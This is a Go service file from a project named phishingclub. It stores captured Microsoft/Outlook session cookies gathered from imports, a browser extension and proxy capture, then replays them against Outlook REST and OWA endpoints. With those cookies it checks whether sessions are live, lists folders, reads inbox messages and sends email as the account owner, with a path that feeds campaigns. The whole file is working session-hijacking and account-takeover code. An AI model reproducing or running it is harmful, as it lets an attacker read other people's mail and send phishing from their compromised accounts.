package service

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/phishingclub/phishingclub/database"
	"github.com/phishingclub/phishingclub/errs"
	"github.com/phishingclub/phishingclub/model"
	"github.com/phishingclub/phishingclub/repository"
	"go.uber.org/zap"
)

const (
	outlookUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)

// outlookDomains are the Microsoft/Outlook cookie domains to include
var outlookDomains = []string{
	".outlook.office365.com", ".outlook.office.com", ".outlook.live.com",
	".office365.com", ".office.com", ".live.com", ".microsoft.com",
	".login.microsoftonline.com",
}

// CookieStoreService handles cookie storage, validation, sending, and inbox reading
type CookieStoreService struct {
	Common
	Logger           *zap.SugaredLogger
	CookieStoreRepo  *repository.CookieStore
	ProxyCaptureRepo *repository.ProxyCapture
}

// Import imports cookies from a request (manual import, extension, or proxy capture)
func (s *CookieStoreService) Import(
	ctx context.Context,
	session *model.Session,
	req *model.CookieStoreImportRequest,
) (*uuid.UUID, error) {
	// session can be nil for extension calls (unauthenticated)
	if session != nil {
		isAuthorized, err := IsAuthorized(session, "campaign.create")
		if err != nil {
			s.LogAuthError(err)
			return nil, errs.Wrap(err)
		}
		if !isAuthorized {
			return nil, errs.ErrAuthorizationFailed
		}
	}

	cookiesJSON, err := json.Marshal(req.Cookies)
	if err != nil {
		return nil, errs.Wrap(err)
	}

	source := req.Source
	if source == "" {
		source = "import"
	}

	m := map[string]interface{}{
		"name":         req.Name,
		"source":       source,
		"cookies_json": string(cookiesJSON),
		"cookie_count": len(req.Cookies),
		"is_valid":     false,
	}

	if session != nil && session.User != nil && session.User.CompanyID.IsSpecified() && !session.User.CompanyID.IsNull() {
		m["company_id"] = session.User.CompanyID.MustGet()
	}

	id, err := s.CookieStoreRepo.Insert(ctx, m)
	if err != nil {
		return nil, errs.Wrap(err)
	}

	// Validate the session asynchronously
	go func() {
		bgCtx := context.Background()
		_ = s.validateAndUpdate(bgCtx, *id)
	}()

	return id, nil
}

// ImportFromExtension imports cookies received from the Chrome Extension
func (s *CookieStoreService) ImportFromExtension(
	ctx context.Context,
	name string,
	cookies []model.ImportCookie,
	ip string,
) (*uuid.UUID, error) {
	cookiesJSON, err := json.Marshal(cookies)
	if err != nil {
		return nil, errs.Wrap(err)
	}

	m := map[string]interface{}{
		"name":         name,
		"source":       "extension",
		"cookies_json": string(cookiesJSON),
		"cookie_count": len(cookies),
		"is_valid":     false,
	}

	id, err := s.CookieStoreRepo.Insert(ctx, m)
	if err != nil {
		return nil, errs.Wrap(err)
	}

	// Validate asynchronously
	go func() {
		bgCtx := context.Background()
		_ = s.validateAndUpdate(bgCtx, *id)
	}()

	return id, nil
}

// ImportFromProxyCapture imports cookies from a proxy capture record
func (s *CookieStoreService) ImportFromProxyCapture(
	ctx context.Context,
	session *model.Session,
	captureID uuid.UUID,
	name string,
	cookiesJSON string,
) (*uuid.UUID, error) {
	isAuthorized, err := IsAuthorized(session, "campaign.create")
	if err != nil {
		s.LogAuthError(err)
		return nil, errs.Wrap(err)
	}
	if !isAuthorized {
		return nil, errs.ErrAuthorizationFailed
	}

	// Count cookies
	var cookies []model.ImportCookie
	_ = json.Unmarshal([]byte(cookiesJSON), &cookies)

	m := map[string]interface{}{
		"name":             name,
		"source":           "proxy_capture",
		"cookies_json":     cookiesJSON,
		"cookie_count":     len(cookies),
		"is_valid":         false,
		"proxy_capture_id": captureID,
	}

	if session.User != nil && session.User.CompanyID.IsSpecified() && !session.User.CompanyID.IsNull() {
		m["company_id"] = session.User.CompanyID.MustGet()
	}

	id, err := s.CookieStoreRepo.Insert(ctx, m)
	if err != nil {
		return nil, errs.Wrap(err)
	}

	// Validate asynchronously
	go func() {
		bgCtx := context.Background()
		_ = s.validateAndUpdate(bgCtx, *id)
	}()

	return id, nil
}

// GetAll returns all cookie stores with pagination
func (s *CookieStoreService) GetAll(
	ctx context.Context,
	session *model.Session,
	option *repository.CookieStoreOption,
) (*model.Result[database.CookieStore], error) {
	isAuthorized, err := IsAuthorized(session, "campaign.create")
	if err != nil {
		s.LogAuthError(err)
		return nil, errs.Wrap(err)
	}
	if !isAuthorized {
		return nil, errs.ErrAuthorizationFailed
	}

	var companyID *uuid.UUID
	if session.User != nil && session.User.CompanyID.IsSpecified() && !session.User.CompanyID.IsNull() {
		cid := session.User.CompanyID.MustGet()
		companyID = &cid
	}
	return s.CookieStoreRepo.GetAll(ctx, companyID, option)
}

// GetByID returns a cookie store by ID
func (s *CookieStoreService) GetByID(
	ctx context.Context,
	session *model.Session,
	id uuid.UUID,
) (*database.CookieStore, error) {
	isAuthorized, err := IsAuthorized(session, "campaign.create")
	if err != nil {
		s.LogAuthError(err)
		return nil, errs.Wrap(err)
	}
	if !isAuthorized {
		return nil, errs.ErrAuthorizationFailed
	}

	return s.CookieStoreRepo.GetByID(ctx, id)
}

// Delete deletes a cookie store by ID
func (s *CookieStoreService) Delete(
	ctx context.Context,
	session *model.Session,
	id uuid.UUID,
) error {
	isAuthorized, err := IsAuthorized(session, "campaign.create")
	if err != nil {
		s.LogAuthError(err)
		return errs.Wrap(err)
	}
	if !isAuthorized {
		return errs.ErrAuthorizationFailed
	}

	return s.CookieStoreRepo.DeleteByID(ctx, id)
}

// DeleteAll deletes all cookie stores
func (s *CookieStoreService) DeleteAll(
	ctx context.Context,
	session *model.Session,
) error {
	isAuthorized, err := IsAuthorized(session, "campaign.create")
	if err != nil {
		s.LogAuthError(err)
		return errs.Wrap(err)
	}
	if !isAuthorized {
		return errs.ErrAuthorizationFailed
	}

	return s.CookieStoreRepo.DeleteAll(ctx)
}

// Revalidate re-checks if a cookie session is still valid
func (s *CookieStoreService) Revalidate(
	ctx context.Context,
	session *model.Session,
	id uuid.UUID,
) (*database.CookieStore, error) {
	isAuthorized, err := IsAuthorized(session, "campaign.create")
	if err != nil {
		s.LogAuthError(err)
		return nil, errs.Wrap(err)
	}
	if !isAuthorized {
		return nil, errs.ErrAuthorizationFailed
	}

	if err := s.validateAndUpdate(ctx, id); err != nil {
		return nil, err
	}

	return s.CookieStoreRepo.GetByID(ctx, id)
}

// SendEmail sends an email using captured cookies
func (s *CookieStoreService) SendEmail(
	ctx context.Context,
	session *model.Session,
	req *model.CookieSendRequest,
) (*model.CookieSendResult, error) {
	isAuthorized, err := IsAuthorized(session, "campaign.create")
	if err != nil {
		s.LogAuthError(err)
		return nil, errs.Wrap(err)
	}
	if !isAuthorized {
		return nil, errs.ErrAuthorizationFailed
	}

	storeID, err := uuid.Parse(req.CookieStoreID)
	if err != nil {
		return nil, fmt.Errorf("invalid cookie store ID: %s", req.CookieStoreID)
	}

	store, err := s.CookieStoreRepo.GetByID(ctx, storeID)
	if err != nil {
		return nil, fmt.Errorf("cookie store not found: %s", req.CookieStoreID)
	}

	cookieHeader := s.buildCookieHeader(store.CookiesJSON)
	if cookieHeader == "" {
		return &model.CookieSendResult{
			Success: false,
			Error:   "No Outlook/Microsoft cookies found in this store",
			SentAt:  time.Now().UTC().Format(time.RFC3339),
		}, nil
	}

	// Build message payload
	message := s.buildMessagePayload(req, store.Email)

	// Attempt 1: Outlook REST API v2.0
	result := s.sendViaRestAPI(ctx, cookieHeader, message, req)
	if result.Success {
		s.Logger.Infow("cookie-based email sent via REST API", "to", req.To, "storeID", req.CookieStoreID)
		return result, nil
	}
	s.Logger.Warnw("REST API send failed, trying OWA fallback", "error", result.Error)

	// Attempt 2: OWA sendmail endpoint
	result = s.sendViaOWA(ctx, cookieHeader, req)
	if result.Success {
		s.Logger.Infow("cookie-based email sent via OWA", "to", req.To, "storeID", req.CookieStoreID)
		return result, nil
	}

	return &model.CookieSendResult{
		Success: false,
		Error:   fmt.Sprintf("all send methods failed: REST=%s", result.Error),
		SentAt:  time.Now().UTC().Format(time.RFC3339),
	}, nil
}

// SendEmailDirect sends an email using a cookie store ID directly (for campaign pipeline)
func (s *CookieStoreService) SendEmailDirect(
	ctx context.Context,
	storeID uuid.UUID,
	to, subject, htmlBody, fromEmail string,
) (*model.CookieSendResult, error) {
	store, err := s.CookieStoreRepo.GetByID(ctx, storeID)
	if err != nil {
		return &model.CookieSendResult{
			Success: false,
			Error:   fmt.Sprintf("cookie store not found: %s", storeID.String()),
			SentAt:  time.Now().UTC().Format(time.RFC3339),
		}, nil
	}

	cookieHeader := s.buildCookieHeader(store.CookiesJSON)
	if cookieHeader == "" {
		return &model.CookieSendResult{
			Success: false,
			Error:   "No Outlook/Microsoft cookies found",
			SentAt:  time.Now().UTC().Format(time.RFC3339),
		}, nil
	}

	req := &model.CookieSendRequest{
		CookieStoreID: storeID.String(),
		To:            []string{to},
		Subject:       subject,
		Body:          htmlBody,
		IsHTML:        true,
		SaveToSent:    false,
	}

	message := s.buildMessagePayload(req, fromEmail)

	// Try REST API first
	result := s.sendViaRestAPI(ctx, cookieHeader, message, req)
	if result.Success {
		return result, nil
	}

	// Fallback to OWA
	return s.sendViaOWA(ctx, cookieHeader, req), nil
}

// GetInbox reads the inbox of a cookie session
func (s *CookieStoreService) GetInbox(
	ctx context.Context,
	session *model.Session,
	storeID uuid.UUID,
	folder string,
	limit int,
	skip int,
) ([]model.InboxMessage, int, error) {
	isAuthorized, err := IsAuthorized(session, "campaign.create")
	if err != nil {
		s.LogAuthError(err)
		return nil, 0, errs.Wrap(err)
	}
	if !isAuthorized {
		return nil, 0, errs.ErrAuthorizationFailed
	}

	store, err := s.CookieStoreRepo.GetByID(ctx, storeID)
	if err != nil {
		return nil, 0, fmt.Errorf("cookie store not found")
	}

	cookieHeader := s.buildCookieHeader(store.CookiesJSON)
	if cookieHeader == "" {
		return nil, 0, fmt.Errorf("no Outlook/Microsoft cookies found")
	}

	if folder == "" {
		folder = "inbox"
	}
	if limit <= 0 || limit > 50 {
		limit = 25
	}

	apiURL := fmt.Sprintf(
		"https://outlook.office365.com/api/v2.0/me/mailfolders/%s/messages?$top=%d&$skip=%d&$orderby=ReceivedDateTime%%20desc&$select=Id,From,Subject,ReceivedDateTime,BodyPreview,ConversationId,IsRead,HasAttachments,ToRecipients",
		folder, limit, skip,
	)

	httpReq, err := http.NewRequestWithContext(ctx, "GET", apiURL, nil)
	if err != nil {
		return nil, 0, errs.Wrap(err)
	}
	httpReq.Header.Set("Cookie", cookieHeader)
	httpReq.Header.Set("User-Agent", outlookUserAgent)
	httpReq.Header.Set("Accept", "application/json")

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(httpReq)
	if err != nil {
		return nil, 0, errs.Wrap(err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		// Try alternative endpoint without folder
		altURL := fmt.Sprintf(
			"https://outlook.office365.com/api/v2.0/me/messages?$top=%d&$skip=%d&$orderby=ReceivedDateTime%%20desc&$select=Id,From,Subject,ReceivedDateTime,BodyPreview,ConversationId,IsRead,HasAttachments",
			limit, skip,
		)
		altReq, _ := http.NewRequestWithContext(ctx, "GET", altURL, nil)
		altReq.Header.Set("Cookie", cookieHeader)
		altReq.Header.Set("User-Agent", outlookUserAgent)
		altReq.Header.Set("Accept", "application/json")

		altResp, altErr := client.Do(altReq)
		if altErr != nil {
			return nil, 0, fmt.Errorf("cookie session may be expired (HTTP %d)", resp.StatusCode)
		}
		defer altResp.Body.Close()

		if altResp.StatusCode != 200 {
			return nil, 0, fmt.Errorf("cookie session expired or invalid (HTTP %d)", altResp.StatusCode)
		}

		return s.parseMessagesResponse(altResp.Body)
	}

	return s.parseMessagesResponse(resp.Body)
}

// GetMessage reads a specific email message
func (s *CookieStoreService) GetMessage(
	ctx context.Context,
	session *model.Session,
	storeID uuid.UUID,
	messageID string,
) (*model.InboxMessageFull, error) {
	isAuthorized, err := IsAuthorized(session, "campaign.create")
	if err != nil {
		s.LogAuthError(err)
		return nil, errs.Wrap(err)
	}
	if !isAuthorized {
		return nil, errs.ErrAuthorizationFailed
	}

	store, err := s.CookieStoreRepo.GetByID(ctx, storeID)
	if err != nil {
		return nil, fmt.Errorf("cookie store not found")
	}

	cookieHeader := s.buildCookieHeader(store.CookiesJSON)
	if cookieHeader == "" {
		return nil, fmt.Errorf("no Outlook/Microsoft cookies found")
	}

	apiURL := fmt.Sprintf(
		"https://outlook.office365.com/api/v2.0/me/messages/%s?$select=Id,From,Subject,ReceivedDateTime,Body,BodyPreview,IsRead,HasAttachments,ToRecipients,CcRecipients,Importance",
		messageID,
	)

	httpReq, err := http.NewRequestWithContext(ctx, "GET", apiURL, nil)
	if err != nil {
		return nil, errs.Wrap(err)
	}
	httpReq.Header.Set("Cookie", cookieHeader)
	httpReq.Header.Set("User-Agent", outlookUserAgent)
	httpReq.Header.Set("Accept", "application/json")

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(httpReq)
	if err != nil {
		return nil, errs.Wrap(err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("failed to read message (HTTP %d)", resp.StatusCode)
	}

	var msgData struct {
		ID               string `json:"Id"`
		Subject          string `json:"Subject"`
		ReceivedDateTime string `json:"ReceivedDateTime"`
		IsRead           bool   `json:"IsRead"`
		HasAttachments   bool   `json:"HasAttachments"`
		BodyPreview      string `json:"BodyPreview"`
		Body             struct {
			ContentType string `json:"ContentType"`
			Content     string `json:"Content"`
		} `json:"Body"`
		From struct {
			EmailAddress struct {
				Address string `json:"Address"`
				Name    string `json:"Name"`
			} `json:"EmailAddress"`
		} `json:"From"`
		ToRecipients []struct {
			EmailAddress struct {
				Address string `json:"Address"`
			} `json:"EmailAddress"`
		} `json:"ToRecipients"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&msgData); err != nil {
		return nil, errs.Wrap(err)
	}

	toAddrs := make([]string, 0)
	for _, r := range msgData.ToRecipients {
		if r.EmailAddress.Address != "" {
			toAddrs = append(toAddrs, r.EmailAddress.Address)
		}
	}

	bodyHTML := ""
	bodyText := ""
	if strings.EqualFold(msgData.Body.ContentType, "HTML") {
		bodyHTML = msgData.Body.Content
	} else {
		bodyText = msgData.Body.Content
	}

	return &model.InboxMessageFull{
		InboxMessage: model.InboxMessage{
			ID:             msgData.ID,
			From:           msgData.From.EmailAddress.Address,
			FromName:       msgData.From.EmailAddress.Name,
			To:             toAddrs,
			Subject:        msgData.Subject,
			Preview:        msgData.BodyPreview,
			Date:           msgData.ReceivedDateTime,
			IsRead:         msgData.IsRead,
			HasAttachments: msgData.HasAttachments,
		},
		BodyHTML: bodyHTML,
		BodyText: bodyText,
	}, nil
}

// GetFolders lists mail folders for a cookie session
func (s *CookieStoreService) GetFolders(
	ctx context.Context,
	session *model.Session,
	storeID uuid.UUID,
) ([]model.InboxFolder, error) {
	isAuthorized, err := IsAuthorized(session, "campaign.create")
	if err != nil {
		s.LogAuthError(err)
		return nil, errs.Wrap(err)
	}
	if !isAuthorized {
		return nil, errs.ErrAuthorizationFailed
	}

	store, err := s.CookieStoreRepo.GetByID(ctx, storeID)
	if err != nil {
		return nil, fmt.Errorf("cookie store not found")
	}

	cookieHeader := s.buildCookieHeader(store.CookiesJSON)
	if cookieHeader == "" {
		return nil, fmt.Errorf("no Outlook/Microsoft cookies found")
	}

	apiURL := "https://outlook.office365.com/api/v2.0/me/mailfolders?$select=Id,DisplayName,TotalItemCount,UnreadItemCount"

	httpReq, err := http.NewRequestWithContext(ctx, "GET", apiURL, nil)
	if err != nil {
		return nil, errs.Wrap(err)
	}
	httpReq.Header.Set("Cookie", cookieHeader)
	httpReq.Header.Set("User-Agent", outlookUserAgent)
	httpReq.Header.Set("Accept", "application/json")

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(httpReq)
	if err != nil {
		return nil, errs.Wrap(err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("failed to list folders (HTTP %d)", resp.StatusCode)
	}

	var folderData struct {
		Value []struct {
			ID              string `json:"Id"`
			DisplayName     string `json:"DisplayName"`
			TotalItemCount  int    `json:"TotalItemCount"`
			UnreadItemCount int    `json:"UnreadItemCount"`
		} `json:"value"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&folderData); err != nil {
		return nil, errs.Wrap(err)
	}

	folders := make([]model.InboxFolder, len(folderData.Value))
	for i, f := range folderData.Value {
		folders[i] = model.InboxFolder{
			ID:              f.ID,
			DisplayName:     f.DisplayName,
			TotalItemCount:  f.TotalItemCount,
			UnreadItemCount: f.UnreadItemCount,
		}
	}

	return folders, nil
}

// --- Internal helpers ---

// buildCookieHeader builds a Cookie header string from stored cookies JSON,
// filtering to only Outlook/Microsoft domains
func (s *CookieStoreService) buildCookieHeader(cookiesJSON string) string {
	var cookies []model.ImportCookie
	if err := json.Unmarshal([]byte(cookiesJSON), &cookies); err != nil {
		s.Logger.Errorw("failed to parse cookies JSON", "error", err)
		return ""
	}

	var parts []string
	for _, c := range cookies {
		domain := c.Domain
		if !strings.HasPrefix(domain, ".") {
			domain = "." + domain
		}
		isOutlook := false
		for _, od := range outlookDomains {
			if strings.HasSuffix(domain, od) || domain == od {
				isOutlook = true
				break
			}
		}
		if isOutlook {
			parts = append(parts, fmt.Sprintf("%s=%s", c.Name, c.Value))
		}
	}

	return strings.Join(parts, "; ")
}

// validateAndUpdate validates a cookie session and updates the database record
func (s *CookieStoreService) validateAndUpdate(ctx context.Context, id uuid.UUID) error {
	store, err := s.CookieStoreRepo.GetByID(ctx, id)
	if err != nil {
		return err
	}

	cookieHeader := s.buildCookieHeader(store.CookiesJSON)
	if cookieHeader == "" {
		now := time.Now()
		return s.CookieStoreRepo.Update(ctx, id, map[string]interface{}{
			"is_valid":     false,
			"last_checked": now,
		})
	}

	email, displayName, valid := s.validateSession(ctx, cookieHeader)

	now := time.Now()
	updates := map[string]interface{}{
		"is_valid":     valid,
		"last_checked": now,
	}
	if email != "" {
		updates["email"] = email
	}
	if displayName != "" {
		updates["display_name"] = displayName
	}

	return s.CookieStoreRepo.Update(ctx, id, updates)
}

// validateSession checks if a cookie session is valid against Outlook APIs
func (s *CookieStoreService) validateSession(ctx context.Context, cookieHeader string) (email, displayName string, valid bool) {
	// Try REST API /me endpoint
	httpReq, err := http.NewRequestWithContext(ctx, "GET", "https://outlook.office365.com/api/v2.0/me", nil)
	if err == nil {
		httpReq.Header.Set("Cookie", cookieHeader)
		httpReq.Header.Set("User-Agent", outlookUserAgent)

		client := &http.Client{Timeout: 15 * time.Second}
		resp, err := client.Do(httpReq)
		if err == nil {
			defer resp.Body.Close()
			if resp.StatusCode == 200 {
				var data struct {
					EmailAddress string `json:"EmailAddress"`
					DisplayName  string `json:"DisplayName"`
					ID           string `json:"Id"`
				}
				if json.NewDecoder(resp.Body).Decode(&data) == nil {
					email = data.EmailAddress
					if email == "" {
						email = data.ID
					}
					displayName = data.DisplayName
					return email, displayName, true
				}
			}
		}
	}

	// Fallback: try OWA
	httpReq2, err := http.NewRequestWithContext(ctx, "GET", "https://outlook.office365.com/owa/", nil)
	if err == nil {
		httpReq2.Header.Set("Cookie", cookieHeader)
		httpReq2.Header.Set("User-Agent", outlookUserAgent)

		client := &http.Client{
			Timeout: 15 * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}
		resp, err := client.Do(httpReq2)
		if err == nil {
			defer resp.Body.Close()
			if resp.StatusCode == 200 {
				return "unknown (OWA session)", "", true
			}
		}
	}

	return "", "", false
}

// buildMessagePayload builds the Outlook REST API message payload
func (s *CookieStoreService) buildMessagePayload(req *model.CookieSendRequest, fromEmail string) map[string]interface{} {
	toRecipients := make([]map[string]interface{}, len(req.To))
	for i, email := range req.To {
		toRecipients[i] = map[string]interface{}{
			"EmailAddress": map[string]string{"Address": email},
		}
	}

	contentType := "Text"
	if req.IsHTML {
		contentType = "HTML"
	}

	message := map[string]interface{}{
		"Subject": req.Subject,
		"Body": map[string]interface{}{
			"ContentType": contentType,
			"Content":     req.Body,
		},
		"ToRecipients": toRecipients,
	}

	if fromEmail != "" {
		message["From"] = map[string]interface{}{
			"EmailAddress": map[string]string{
				"Address": fromEmail,
			},
		}
	}

	if len(req.CC) > 0 {
		ccRecipients := make([]map[string]interface{}, len(req.CC))
		for i, email := range req.CC {
			ccRecipients[i] = map[string]interface{}{
				"EmailAddress": map[string]string{"Address": email},
			}
		}
		message["CcRecipients"] = ccRecipients
	}

	if len(req.BCC) > 0 {
		bccRecipients := make([]map[string]interface{}, len(req.BCC))
		for i, email := range req.BCC {
			bccRecipients[i] = map[string]interface{}{
				"EmailAddress": map[string]string{"Address": email},
			}
		}
		message["BccRecipients"] = bccRecipients
	}

	return message
}

// sendViaRestAPI sends an email via Outlook REST API v2.0
func (s *CookieStoreService) sendViaRestAPI(ctx context.Context, cookieHeader string, message map[string]interface{}, req *model.CookieSendRequest) *model.CookieSendResult {
	payload := map[string]interface{}{
		"Message":         message,
		"SaveToSentItems": req.SaveToSent,
	}

	body, _ := json.Marshal(payload)

	httpReq, err := http.NewRequestWithContext(ctx, "POST",
		"https://outlook.office365.com/api/v2.0/me/sendmail", bytes.NewReader(body))
	if err != nil {
		return &model.CookieSendResult{
			Success: false, Method: "rest_api", Error: err.Error(),
			SentAt: time.Now().UTC().Format(time.RFC3339),
		}
	}

	httpReq.Header.Set("Cookie", cookieHeader)
	httpReq.Header.Set("Content-Type", "application/json")
	httpReq.Header.Set("User-Agent", outlookUserAgent)
	httpReq.Header.Set("Accept", "application/json")

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(httpReq)
	if err != nil {
		return &model.CookieSendResult{
			Success: false, Method: "rest_api", Error: err.Error(),
			SentAt: time.Now().UTC().Format(time.RFC3339),
		}
	}
	defer resp.Body.Close()

	if resp.StatusCode == 202 || resp.StatusCode == 200 {
		return &model.CookieSendResult{
			Success:   true,
			Method:    "rest_api",
			MessageID: fmt.Sprintf("cookie-rest-%d", time.Now().UnixMilli()),
			SentAt:    time.Now().UTC().Format(time.RFC3339),
		}
	}

	respBody, _ := io.ReadAll(resp.Body)
	return &model.CookieSendResult{
		Success: false, Method: "rest_api",
		Error:  fmt.Sprintf("HTTP %d: %s", resp.StatusCode, string(respBody)),
		SentAt: time.Now().UTC().Format(time.RFC3339),
	}
}

// sendViaOWA sends an email via OWA endpoint (fallback)
func (s *CookieStoreService) sendViaOWA(ctx context.Context, cookieHeader string, req *model.CookieSendRequest) *model.CookieSendResult {
	owaPayload := map[string]interface{}{
		"__type": "SendItemRequest:#Exchange",
		"Items": []map[string]interface{}{
			{
				"__type":  "Message:#Exchange",
				"Subject": req.Subject,
				"Body": map[string]interface{}{
					"__type":   "BodyContentType:#Exchange",
					"BodyType": "HTML",
					"Value":    req.Body,
				},
				"ToRecipients": s.buildOWARecipients(req.To),
			},
		},
	}

	body, _ := json.Marshal(owaPayload)

	httpReq, err := http.NewRequestWithContext(ctx, "POST",
		"https://outlook.office365.com/owa/service.svc?action=CreateItem&ID=-1&AC=1",
		bytes.NewReader(body))
	if err != nil {
		return &model.CookieSendResult{
			Success: false, Method: "owa", Error: err.Error(),
			SentAt: time.Now().UTC().Format(time.RFC3339),
		}
	}

	httpReq.Header.Set("Cookie", cookieHeader)
	httpReq.Header.Set("Content-Type", "application/json; charset=utf-8")
	httpReq.Header.Set("User-Agent", outlookUserAgent)
	httpReq.Header.Set("Action", "CreateItem")

	// Extract X-OWA-CANARY from cookies
	canary := s.extractCanary(cookieHeader)
	if canary != "" {
		httpReq.Header.Set("X-OWA-CANARY", canary)
	}

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(httpReq)
	if err != nil {
		return &model.CookieSendResult{
			Success: false, Method: "owa", Error: err.Error(),
			SentAt: time.Now().UTC().Format(time.RFC3339),
		}
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 || resp.StatusCode == 202 {
		return &model.CookieSendResult{
			Success:   true,
			Method:    "owa",
			MessageID: fmt.Sprintf("cookie-owa-%d", time.Now().UnixMilli()),
			SentAt:    time.Now().UTC().Format(time.RFC3339),
		}
	}

	respBody, _ := io.ReadAll(resp.Body)
	return &model.CookieSendResult{
		Success: false, Method: "owa",
		Error:  fmt.Sprintf("HTTP %d: %s", resp.StatusCode, string(respBody)),
		SentAt: time.Now().UTC().Format(time.RFC3339),
	}
}

// buildOWARecipients builds OWA-format recipients
func (s *CookieStoreService) buildOWARecipients(emails []string) []map[string]interface{} {
	recipients := make([]map[string]interface{}, len(emails))
	for i, email := range emails {
		recipients[i] = map[string]interface{}{
			"__type": "SingleRecipientType:#Exchange",
			"Mailbox": map[string]interface{}{
				"__type":       "EmailAddressWrapper:#Exchange",
				"EmailAddress": email,
				"Name":         email,
			},
		}
	}
	return recipients
}

// extractCanary extracts the X-OWA-CANARY token from cookies
func (s *CookieStoreService) extractCanary(cookieHeader string) string {
	parts := strings.Split(cookieHeader, ";")
	for _, part := range parts {
		part = strings.TrimSpace(part)
		if strings.HasPrefix(strings.ToLower(part), "x-owa-canary=") {
			idx := strings.Index(part, "=")
			if idx >= 0 {
				return part[idx+1:]
			}
		}
	}
	return ""
}

// parseMessagesResponse parses the Outlook REST API messages response
func (s *CookieStoreService) parseMessagesResponse(body io.Reader) ([]model.InboxMessage, int, error) {
	var msgData struct {
		Value []struct {
			ID               string `json:"Id"`
			Subject          string `json:"Subject"`
			ReceivedDateTime string `json:"ReceivedDateTime"`
			BodyPreview      string `json:"BodyPreview"`
			ConversationID   string `json:"ConversationId"`
			IsRead           bool   `json:"IsRead"`
			HasAttachments   bool   `json:"HasAttachments"`
			From             struct {
				EmailAddress struct {
					Address string `json:"Address"`
					Name    string `json:"Name"`
				} `json:"EmailAddress"`
			} `json:"From"`
			ToRecipients []struct {
				EmailAddress struct {
					Address string `json:"Address"`
				} `json:"EmailAddress"`
			} `json:"ToRecipients"`
		} `json:"value"`
	}

	if err := json.NewDecoder(body).Decode(&msgData); err != nil {
		return nil, 0, errs.Wrap(err)
	}

	messages := make([]model.InboxMessage, len(msgData.Value))
	for i, m := range msgData.Value {
		toAddrs := make([]string, 0)
		for _, r := range m.ToRecipients {
			if r.EmailAddress.Address != "" {
				toAddrs = append(toAddrs, r.EmailAddress.Address)
			}
		}

		messages[i] = model.InboxMessage{
			ID:             m.ID,
			From:           m.From.EmailAddress.Address,
			FromName:       m.From.EmailAddress.Name,
			To:             toAddrs,
			Subject:        m.Subject,
			Preview:        m.BodyPreview,
			Date:           m.ReceivedDateTime,
			IsRead:         m.IsRead,
			HasAttachments: m.HasAttachments,
			ConversationID: m.ConversationID,
		}
	}

	return messages, len(messages), nil
}
